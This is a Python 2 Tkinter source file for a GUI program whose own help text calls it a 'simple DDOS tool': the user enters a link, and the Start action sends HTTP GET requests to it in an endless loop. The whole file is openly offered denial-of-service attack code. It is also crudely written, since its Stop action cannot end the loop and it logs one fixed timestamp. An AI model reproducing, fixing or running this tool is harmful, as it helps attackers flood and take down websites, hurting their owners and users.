from Tkinter import *
import Tkinter
import webbrowser
import tkMessageBox
import urllib2
import time
localtime = time.localtime(time.time())
def Set_link():
   global entryWidget
   if entryWidget.get().strip() == "":
        tkMessageBox.showerror("Message", "Enter a Link")
   else:
        tkMessageBox.showinfo("Message", "Link set = " + entryWidget.get().strip())
#----------------------------------------------------------------------------
def default():
 master = Tk()
 tkMessageBox.showerror("Message", "Alreay in use!!")
 mainloop()
#----------------------------------------------------------------------------
def donothing():
   pass
#----------------------------------------------------------------------------
def Start_task():
    Task_run = True
    while Task_run == True:
     urllib2.urlopen(entryWidget.get().strip())
     print "Request Send at :" , localtime
#-----------------------------------------------------------------------------
def Kill_task():
   Task_run = False
   tkMessageBox.showinfo( "Message", "successfully stopped")
#-=-----------------------------------------------------------------------------
def Help():
   tkMessageBox.showinfo( "Help", "this is a simple DDOS tool with HTTP GET PROTOCOL METHOD ")
#------------------------------------------------------------------------------
def About():
   tkMessageBox.showinfo( "About", "DDos bacis tool")
   tkMessageBox.showinfo( "About", "by by El Sonador")
   tkMessageBox.showinfo( "About", "version 1.0")
#------------------------------------------------------------------------------
root = Tk()
background = "BLUE"
textColor = ""
root.configure(bg=background)
root.title("Simple DDOS TOOL BY EL SONADOR")
root["padx"] = 40
root["pady"] = 20
textFrame = Frame(root)
entryLabel = Label(textFrame)
entryLabel["text"] = "Enter the link:"
entryLabel.pack(side=LEFT)
entryWidget = Entry(textFrame)
entryWidget["width"] = 70
entryWidget.pack(side=LEFT)
textFrame.pack()
button = Button(root, text="Set Link", command=Set_link)
button.pack()
menubar = Menu(root)
filemenu = Menu(menubar, tearoff=0)
menubar.add_cascade(label="Action", menu=filemenu)
filemenu.add_command(label="Start", command=Start_task)
filemenu.add_command(label="Stop", command=Kill_task)
#------------------------------------------------------------------------------
editmenu = Menu(menubar, tearoff=0)
menubar.add_cascade(label="Settings", menu=editmenu)
editmenu.add_command(label="HTTP GET METHOD", command=default)
#=----------------------------------------------------------------------------
helpmenu = Menu(menubar, tearoff=0)
menubar.add_cascade(label="Help", menu=helpmenu)
helpmenu.add_command(label="Help", command=Help)
helpmenu.add_command(label="About...", command=About)
helpmenu.add_command(label="Download updates",command=donothing)
#--------------------------------------------------------------------
root.config(menu=menubar)
root.mainloop()
